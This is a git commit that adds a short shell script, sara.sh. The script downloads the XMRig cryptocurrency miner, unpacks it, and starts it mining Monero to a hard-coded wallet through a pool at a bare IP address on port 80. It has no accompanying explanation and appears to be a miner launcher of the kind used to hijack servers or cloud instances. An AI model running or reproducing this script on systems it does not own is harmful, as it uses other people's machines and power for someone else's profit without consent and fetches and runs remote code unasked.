b620ddb5a468fdc7a646716111c690f835ab4219
chirifa201 <45911600+chirifa201@users.noreply.github.com>
2021-12-29 21:43:25 +0100

    Create sara.sh

---
+++ sara.sh
@@ -0,0 +1,5 @@
+sudo apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz
+tar xvzf xmrig-6.15.2-linux-x64.tar.gz
+cd xmrig-6.15.2
+./xmrig -a rx/0 -o 195.201.124.214:80 -u 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j
